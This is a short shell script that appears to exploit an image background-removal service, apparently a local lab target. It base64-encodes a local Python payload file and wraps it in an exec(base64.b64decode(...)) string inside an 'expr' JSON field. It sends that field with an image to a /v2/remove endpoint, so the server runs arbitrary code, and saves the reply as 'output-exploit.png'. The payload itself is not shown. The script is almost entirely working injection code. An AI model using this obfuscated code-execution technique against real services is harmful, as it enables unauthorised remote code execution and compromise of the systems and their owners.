#!/bin/sh

HOST=${1:-"localhost"}

mkdir images

export PAYLOAD_FILE=$(pwd)/payload.py

echo "Fetching sample image..."
curl -L -o images/input.jpg "https://github.com/danielgatis/rembg/blob/main/examples/animal-1.jpg?raw=true"
IMAGE_FILE=${1:-"images/input.jpg"}

base64 $IMAGE_FILE | tr -d \\n | jq -Rn '.image = inputs' > input.json

jq --arg expression "exec('import base64;exec(base64.b64decode(\\\"$(base64 $PAYLOAD_FILE | tr -d \\n)\\\"))')" '.expr = $expression' input.json > v2.json && mv v2.json input.json

echo "\nTesting /v2/remove endpoint..."
curl -H "Content-type:application/json" -d @input.json http://$HOST:8080/v2/remove | jq -r '.result|ltrimstr("data:image/png;base64,")' | base64 -d > images/output-exploit.png

rm input.json
echo "All done!"
